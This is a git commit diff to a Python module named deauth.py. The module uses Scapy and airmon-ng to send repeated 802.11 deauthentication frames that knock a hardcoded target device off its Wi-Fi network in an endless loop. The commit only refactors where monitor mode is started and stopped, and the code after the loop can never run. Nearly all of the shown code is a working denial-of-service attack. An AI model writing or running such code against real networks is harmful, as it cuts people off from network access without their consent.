fa3cfa71c0b3b1dfe4b244a4baab66eb29a80351
Ian Sandi <ian.tayler.sandi@gmail.com>
2025-10-20 02:31:04 -0600

    ...

--- Modules/deauth.py
+++ Modules/deauth.py
@@ -7,14 +7,17 @@ def init(host_socket):
     pass
 
 def run(cmd):
+    target_mac = nt.get_mac_address("10.10.26.67")
+    router_mac = nt.get_router_mac()
+    os.system("sudo airmon-ng start wlan0")
     while True:
 
-        deauth(nt.get_mac_address("10.10.26.67"), nt.get_router_mac())
+        deauth(target_mac, router_mac )
         time.sleep(5)
+    os.system("sudo airmon-ng stop wlan0")
 
 
 def deauth(target_mac, gateway_mac):
-    os.system("sudo airmon-ng start wlan0")
     print("Deauthing...")
     packet = RadioTap() / Dot11(addr1=target_mac,
                                 addr2=gateway_mac,
@@ -22,6 +25,5 @@ def deauth(target_mac, gateway_mac):
     sendp(packet, inter=0.01,
           count=100, iface='wlan0',
           verbose=1)
-    os.system("sudo airmon-ng stop wlan0")
 
 run(deauth)
